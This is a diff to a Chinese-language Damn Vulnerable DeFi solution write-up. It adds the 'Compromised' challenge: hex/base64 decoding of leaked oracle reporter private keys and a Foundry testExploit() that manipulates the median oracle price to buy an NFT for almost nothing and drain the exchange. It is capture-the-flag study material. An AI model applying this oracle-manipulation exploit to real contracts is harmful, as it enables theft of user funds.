@@ -371,10 +371,6 @@ contract TheRewarder is Test{
 
 [Selfie.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/Selfie.t.sol) 
 
-```
-forge test --match-contract Selfie -vvv
-```
-
 ```solidity
 contract PayLoad{
     address public attacker;
@@ -418,5 +414,94 @@ contract Selfie is Test {
     }
 //...    
 }
+```
+
+```
+forge test --match-contract Selfie -vvv
+```
+
+
+
+# #7 - Compromised
+
+合约:
+
+- [DamnValuableNFT.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/DamnValuableNFT.sol) NTF 合约
+- [Exchange.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/compromised/Exchange.sol)  NFT 交易合约
+- [TrustfulOracle.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/compromised/TrustfulOracle.sol) 预言机合约
+- [TrustfulOracleInitializer.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/compromised/TrustfulOracleInitializer.sol) 预言机初始化合约
+
+完成条件:
+
+有一个奇怪的 HTTP 响应 
+
+```http
+          HTTP/2 200 OK
+          content-type: text/html
+          content-language: en
+          vary: Accept-Encoding
+          server: cloudflare
+
+          4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+          4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+        
+```
+
+一个相关的链上交易所正在出售（价格高得离谱）名为“DVNFT”的收藏品，现在每个 999 ETH
+
+该价格来自链上预言机，并基于三个受信任的价格报告者,分别为
+
+`0xA73209FB1a42495120166736362A1DfA9F95A105`,`0xe92401A4d3af5E446d93D11EEc806b1462b39D15` ,`0x81A5D6E50C214044bE44cA0CB057fe119097850c`.
+
+仅有 0.1 ETH, 需要窃取交易所中所有的 ETH.
+
+解决方案:
+
+首选对两段 HTTP 响应 hex 进行解码, 先 HEX -> STR为 base64,base64 解码后为两个私钥,是其中两个受信任的报价来源的外部账户私钥
+
+`0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9` 
+
+`0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48`
+
+![Convert](./testimage/Compromised_HEX_Convert.png)
+
+再看到 `Exchange` 合约的 NFT 的价格计算是来自 ` TrustfulOracle` 预言机 **getMedianPrice()** 函数,预言机里对价格的计算取来自受信任的报价者的三个报价的中值,这里我们掌控了两个私钥,也就可以操控价格,在调用 `buyOne()`函数时,用两个受信任的报价者有权限调用预言机合约  **postPrice()** 报价为 0,以很低的价格购买 NFT, **sellOne()** 出售 NFT 时将报价设高价格到足以窃取完 `Exchange` 交易合约里的所有 ETH.
+
+使用 foundry 编写测试:
+
+[Compromised.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/Compromised.t.sol) 
+
+```solidity
+    function testExploit() public {
+        bytes memory buyOne_sign = abi.encodeWithSelector(bytes4(keccak256("buyOne()")));
+        address TRUSTED_SOURCE1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        address TRUSTED_SOURCE2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+
+        vm.prank(TRUSTED_SOURCE1);
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(TRUSTED_SOURCE2);
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(attacker);
+        address(exchange).call{value: 0.05 ether}(buyOne_sign);
+
+        vm.prank(TRUSTED_SOURCE1);
+        trustfulOracle.postPrice("DVNFT", 9990 ether);
+
+        vm.prank(TRUSTED_SOURCE2);
+        trustfulOracle.postPrice("DVNFT", 9990 ether);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), 0);
+        exchange.sellOne(0);
+        vm.stopPrank();
+        verfiy();
+    }
+```
+
+```
+forge test --match-contract Compromised -vvvv
 ```
 
